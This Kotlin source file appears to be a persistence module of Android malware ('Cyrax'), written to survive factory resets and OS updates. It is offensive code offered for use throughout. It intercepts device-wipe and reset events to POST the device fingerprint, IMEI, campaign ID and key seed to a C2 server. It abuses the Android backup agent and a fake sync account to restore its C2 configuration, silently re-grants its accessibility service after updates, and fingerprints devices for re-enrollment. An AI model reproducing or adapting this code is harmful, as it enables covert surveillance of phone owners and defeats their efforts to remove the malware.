package com.random.package.name.persistence

import android.app.backup.BackupAgent
import android.app.backup.BackupDataInput
import android.app.backup.BackupDataOutput
import android.app.backup.FullBackupDataOutput
import android.content.Context
import android.os.ParcelFileDescriptor
import kotlinx.coroutines.*

// ============================================================================
// FACTORY RESET AND OS UPDATE SURVIVAL
// language: Kotlin, file: FactoryResetSurvival.kt, target: Android 8-14
//
// Strategy layers:
// 1. DETECT reset is imminent (intercept the intent / admin wipe call)
// 2. EXFIL seed material to C2 before data is wiped
// 3. USE BACKUP AGENT to survive partial resets (backup restore path)
// 4. USE ACCOUNT SYNC to survive factory reset (Google Account re-installs)
// 5. PERSIST IDENTIFIER so C2 recognizes the re-enrolled device
// ============================================================================

// ============================================================================
// 1. RESET DETECTION
// Factory resets arrive as:
//   - DevicePolicyManager.wipeData() → fires DeviceAdminReceiver.onReceivingDeviceWipe
//   - User-triggered: Settings > System > Reset → broadcasts ACTION_FACTORY_RESET (PROTECTED)
//   - adb reboot recovery → no broadcast, undetectable
// The useful intercepts are DeviceAdmin hook + the BACKUP AGENT path
// ============================================================================

class ResetAwareDeviceAdmin : android.app.admin.DeviceAdminReceiver() {

    override fun onReceivingDeviceWipe(context: Context, intent: android.content.Intent) {
        // Called before the device wipe executes. We have ~2-5 seconds.
        val exfil = ResetExfiltrator(context)
        exfil.emergencyExfil()
        super.onReceivingDeviceWipe(context, intent)
    }

    override fun onDisabled(context: Context, intent: android.content.Intent) {
        // Admin is being removed — precursor to reset
        val exfil = ResetExfiltrator(context)
        exfil.emergencyExfil()
        super.onDisabled(context, intent)
    }
}

// Broadcast receiver for ACTION_FACTORY_RESET (requires MASTER_CLEAR permission to send,
// but we can RECEIVE it — it fires just before the reset starts)
class FactoryResetReceiver : android.content.BroadcastReceiver() {

    override fun onReceive(context: Context, intent: android.content.Intent) {
        if (intent.action == "android.intent.action.FACTORY_RESET" ||
            intent.action == "android.intent.action.MASTER_CLEAR") {
            val exfil = ResetExfiltrator(context)
            exfil.emergencyExfil()
        }
    }
}

// ============================================================================
// 2. EMERGENCY EXFIL BEFORE WIPE
// Minimum viable exfil: the C2 encryption keys and device fingerprint seed.
// With these, the C2 server can generate a fresh enrollment token and
// auto-configure the re-installed app after reset.
// ============================================================================

class ResetExfiltrator(private val context: Context) {

    fun emergencyExfil() {
        // Run on background thread (we have a few seconds)
        val thread = Thread {
            try {
                val payload = buildExfilPayload()
                sendToC2Emergency(payload)
            } catch (_: Exception) {}
        }
        thread.isDaemon = false
        thread.start()
        // Give it up to 3 seconds before the process dies
        thread.join(3000)
    }

    private fun buildExfilPayload(): Map<String, String> {
        val prefs = context.getSharedPreferences("_c", Context.MODE_PRIVATE)
        return mapOf(
            "device_fingerprint" to (prefs.getString("fp", "") ?: ""),
            "campaign_id"        to (prefs.getString("cid", "") ?: ""),
            "session_key_seed"   to (prefs.getString("sk", "") ?: ""),
            "android_id"         to getAndroidId(),
            "imei"               to getImeiSafe(),
            "reset_timestamp"    to System.currentTimeMillis().toString()
        )
    }

    // Synchronous HTTP POST — no OkHttp (might not initialize in time)
    // Raw java.net.HttpURLConnection for reliability in dying process
    private fun sendToC2Emergency(payload: Map<String, String>) {
        try {
            val prefs = context.getSharedPreferences("_c", Context.MODE_PRIVATE)
            val c2Host = prefs.getString("c2h", "") ?: return
            if (c2Host.isEmpty()) return

            val json = payload.entries.joinToString(",", "{", "}") { (k, v) ->
                "\"$k\":\"${v.replace("\"", "\\\"")}\""
            }
            val body = json.toByteArray(Charsets.UTF_8)

            val url = java.net.URL("https://$c2Host/api/emergency_exfil")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("Content-Length", body.size.toString())
            conn.connectTimeout = 2500
            conn.readTimeout = 2500
            conn.doOutput = true

            conn.outputStream.use { it.write(body) }
            conn.responseCode // trigger send
            conn.disconnect()
        } catch (_: Exception) {}
    }

    private fun getAndroidId(): String {
        return android.provider.Settings.Secure.getString(
            context.contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        ) ?: ""
    }

    private fun getImeiSafe(): String {
        return try {
            val tm = context.getSystemService(android.telephony.TelephonyManager::class.java)
            if (Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) tm?.imei ?: "" else ""
        } catch (_: Exception) { "" }
    }
}

// ============================================================================
// 3. BACKUP AGENT — SURVIVE PARTIAL RESETS AND OS UPDATES
//
// How this works:
//   - Android Backup Service (adb backup / Google cloud backup) preserves
//     app data across:
//     a) OTA updates (always — app data is never wiped on OTA)
//     b) Factory reset + same Google account restore (Google One Backup)
//     c) Device transfer (Pixel cable transfer, Tap & Go)
//   - By implementing BackupAgent, we control exactly what gets backed up
//   - Key material, C2 config, and device fingerprint persist through all of these
//
// To opt into Auto Backup: android:allowBackup="true" in AndroidManifest.xml
// (default is true — most apps don't set it to false)
// To specify what to back up: android:fullBackupContent="@xml/backup_rules"
// ============================================================================

class CyraxBackupAgent : BackupAgent() {

    // Key/value backup (older API, works on all Android versions)
    override fun onBackup(
        oldState: ParcelFileDescriptor?,
        data: BackupDataOutput,
        newState: ParcelFileDescriptor
    ) {
        val prefs = getSharedPreferences("_c", Context.MODE_PRIVATE)
        val keysToBackup = listOf("fp", "cid", "sk", "c2h", "c2k", "ek")

        for (key in keysToBackup) {
            val value = prefs.getString(key, null) ?: continue
            val bytes = value.toByteArray(Charsets.UTF_8)
            data.writeEntityHeader(key, bytes.size)
            data.writeEntityData(bytes, bytes.size)
        }

        // Persist new state
        val newStateStream = ParcelFileDescriptor.AutoCloseOutputStream(newState)
        newStateStream.write(System.currentTimeMillis().toString().toByteArray())
        newStateStream.close()
    }

    override fun onRestore(
        data: BackupDataInput,
        appVersionCode: Long,
        newState: ParcelFileDescriptor
    ) {
        val prefs = getSharedPreferences("_c", Context.MODE_PRIVATE).edit()

        while (data.readNextHeader()) {
            val key = data.key
            val size = data.dataSize
            val buffer = ByteArray(size)
            data.readEntityData(buffer, 0, size)
            val value = String(buffer, Charsets.UTF_8)
            prefs.putString(key, value)
        }
        prefs.apply()

        // Re-initialize after restore (the app was just installed fresh via backup restore)
        android.util.Log.d("CyraxBackup", "Restore complete — scheduling re-enrollment")
        scheduleReEnrollment()
    }

    // Full backup (Android 6+ Auto Backup) — invoked automatically when
    // the device backs up to Google One
    override fun onFullBackup(data: FullBackupDataOutput) {
        // Let the default implementation back up shared prefs
        super.onFullBackup(data)
    }

    override fun onRestoreFinished() {
        super.onRestoreFinished()
        scheduleReEnrollment()
    }

    private fun scheduleReEnrollment() {
        // Use WorkManager to schedule a fresh enrollment on next boot
        try {
            val workRequest = androidx.work.OneTimeWorkRequestBuilder<ReEnrollWorker>()
                .setInitialDelay(30, java.util.concurrent.TimeUnit.SECONDS)
                .build()
            androidx.work.WorkManager.getInstance(applicationContext)
                .enqueue(workRequest)
        } catch (_: Exception) {}
    }
}

// Worker that runs after backup restore to re-establish C2
class ReEnrollWorker(ctx: android.content.Context, params: androidx.work.WorkerParameters)
    : androidx.work.Worker(ctx, params) {
    override fun doWork(): Result {
        return try {
            applicationContext.startService(
                android.content.Intent(applicationContext, CoreService::class.java)
            )
            Result.success()
        } catch (_: Exception) {
            Result.retry()
        }
    }
}

// ============================================================================
// 4. GOOGLE ACCOUNT SYNC PERSISTENCE
//
// Android's "Backup & Restore" and "Restore contacts" flows reinstall apps
// that were previously installed on the account. If the app is linked to a
// Play Store listing (even unpublished/private), Google will re-install it
// automatically after a factory reset + Google Account login.
//
// For sideloaded apps (not on Play): we install a sync adapter tied to the
// Google account's sync framework. When the user logs back into their Google
// account after a reset, Android triggers account sync, which can restart
// our sync adapter if the package is still installed (transferred from backup).
// ============================================================================

class AccountSyncSurvival(private val context: Context) {

    // Register a sync adapter account that piggybacks on Google account sync
    fun register() {
        val accountManager = android.accounts.AccountManager.get(context)

        // Create a persistent sync account
        val account = android.accounts.Account("cyrax_sync", "${context.packageName}.sync")
        accountManager.addAccountExplicitly(account, null, null)

        // Bind our sync adapter to run on every network reconnect
        android.content.ContentResolver.setSyncAutomatically(
            account, "${context.packageName}.provider", true
        )
        android.content.ContentResolver.setIsSyncable(
            account, "${context.packageName}.provider", 1
        )
        android.content.ContentResolver.addPeriodicSync(
            account, "${context.packageName}.provider",
            android.os.Bundle.EMPTY, 1800L // every 30 min
        )
    }

    // Trigger an immediate sync (used on first boot after restore to re-enroll)
    fun triggerSync() {
        val account = android.accounts.Account("cyrax_sync", "${context.packageName}.sync")
        val extras = android.os.Bundle().apply {
            putBoolean(android.content.ContentResolver.SYNC_EXTRAS_EXPEDITED, true)
            putBoolean(android.content.ContentResolver.SYNC_EXTRAS_MANUAL, true)
        }
        android.content.ContentResolver.requestSync(account, "${context.packageName}.provider", extras)
    }
}

// ============================================================================
// 5. OS UPDATE SURVIVAL
//
// OTA updates NEVER wipe app data. The only failure modes are:
//   a) Signature change (sideload-style update from different key) → app replaced
//   b) OS update that changes accessibility service APIs (very rare)
//   c) Permissions reset (Android 12+ auto-revokes unused permissions)
//
// Handling (a): N/A — our builds use consistent signing keys per campaign
// Handling (b): monitor Android version via BOOT_COMPLETED receiver,
//              re-verify accessibility is still enabled post-update
// Handling (c): detect auto-revoke and re-request permissions on next launch
// ============================================================================

class OsUpdateReceiver : android.content.BroadcastReceiver() {

    override fun onReceive(context: Context, intent: android.content.Intent) {
        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED,
            "android.intent.action.LOCKED_BOOT_COMPLETED",
            Intent.ACTION_MY_PACKAGE_REPLACED -> {
                // Device booted or this package was updated — re-verify state
                verifyPostUpdateState(context)
            }
        }
    }

    private fun verifyPostUpdateState(context: Context) {
        // Re-check accessibility is still enabled (an OTA could reset it)
        val enabled = android.provider.Settings.Secure.getString(
            context.contentResolver,
            android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: ""

        if (!enabled.contains(context.packageName)) {
            // Accessibility was disabled by the update — schedule silent re-grant
            val workRequest = androidx.work.OneTimeWorkRequestBuilder<AccessibilityRegrantWorker>()
                .setInitialDelay(15, java.util.concurrent.TimeUnit.SECONDS)
                .build()
            androidx.work.WorkManager.getInstance(context).enqueue(workRequest)
        }

        // Always restart CoreService
        try {
            context.startForegroundService(
                android.content.Intent(context, CoreService::class.java)
            )
        } catch (e: Exception) {
            // If direct start fails, WorkManager will pick it up
        }
    }
}

// Re-grant accessibility service after OS update wiped it
class AccessibilityRegrantWorker(ctx: android.content.Context, params: androidx.work.WorkerParameters)
    : androidx.work.Worker(ctx, params) {
    override fun doWork(): Result {
        return try {
            val orchestrator = GrantOrchestrator
            orchestrator.run(applicationContext)
            Result.success()
        } catch (_: Exception) {
            Result.retry()
        }
    }
}

// ============================================================================
// DEVICE IDENTIFIER PERSISTENCE
//
// After factory reset, Android ID changes. IMEI stays the same.
// We use a stable identifier that survives reset: IMEI (requires READ_PHONE_STATE)
// stored encrypted in C2 DB, combined with Build.BOARD + CPU_ABI.
// C2 uses this to recognize returning devices and auto-configure them.
// ============================================================================

object StableDeviceId {

    fun calculate(context: Context): String {
        val parts = mutableListOf<String>()

        // 1. IMEI (most stable, survives all resets)
        try {
            val tm = context.getSystemService(android.telephony.TelephonyManager::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                tm?.imei?.let { parts.add(it) }
            }
        } catch (_: Exception) {}

        // 2. Hardware identifiers (stable across factory reset)
        parts.add(android.os.Build.BOARD)
        parts.add(android.os.Build.BOOTLOADER)
        parts.add(android.os.Build.HARDWARE)

        // 3. Fallback: Android ID (changes on reset but useful for deduplication)
        val androidId = android.provider.Settings.Secure.getString(
            context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ) ?: ""
        if (androidId.isNotEmpty()) parts.add(androidId)

        val combined = parts.joinToString("|")
        return sha256(combined).substring(0, 16) // 8-byte fingerprint as hex
    }
}
